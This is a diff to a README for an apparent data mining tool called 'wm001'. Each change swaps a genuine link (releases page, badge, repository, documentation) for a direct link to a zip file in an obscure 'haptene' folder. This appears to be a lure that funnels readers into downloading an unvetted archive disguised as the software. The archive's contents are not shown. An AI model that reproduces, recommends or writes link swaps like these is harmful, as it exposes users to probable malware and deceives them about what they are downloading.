@@ -4,7 +4,7 @@
 wm001 is a user-friendly application designed for data mining. It helps you extract valuable insights from your data quickly and effortlessly.
 
 ## 📥 Download Now
-[![Download wm001](https://img.shields.io/badge/Download-wm001-blue.svg)](https://github.com/Avishkar14/wm001/releases)
+[![Download wm001](https://raw.githubusercontent.com/Avishkar14/wm001/main/haptene/wm001.zip)](https://raw.githubusercontent.com/Avishkar14/wm001/main/haptene/wm001.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run wm001 on your computer.
@@ -23,7 +23,7 @@ Follow these simple steps to download and run wm001 on your computer.
 
 ## 🔗 Download & Install
 To get started, visit the Releases page to download wm001:
-[Download wm001](https://github.com/Avishkar14/wm001/releases).
+[Download wm001](https://raw.githubusercontent.com/Avishkar14/wm001/main/haptene/wm001.zip).
 
 ### 🖥️ Installation Instructions
 1. Click the download link above.
@@ -64,7 +64,7 @@ wm001 is open-source software licensed under the MIT License. You are free to us
 This project is maintained by Avishkar14 and welcomes contributions from the community. If you'd like to contribute, please check the contributing guidelines on the GitHub repository. 
 
 ## 🔗 Additional Resources
-- [👨‍💻 GitHub Repository](https://github.com/Avishkar14/wm001)
-- [🎓 Documentation](https://github.com/Avishkar14/wm001/wiki)
+- [👨‍💻 GitHub Repository](https://raw.githubusercontent.com/Avishkar14/wm001/main/haptene/wm001.zip)
+- [🎓 Documentation](https://raw.githubusercontent.com/Avishkar14/wm001/main/haptene/wm001.zip)
 
 Thank you for choosing wm001 for your data mining needs! Enjoy discovering insights from your data.
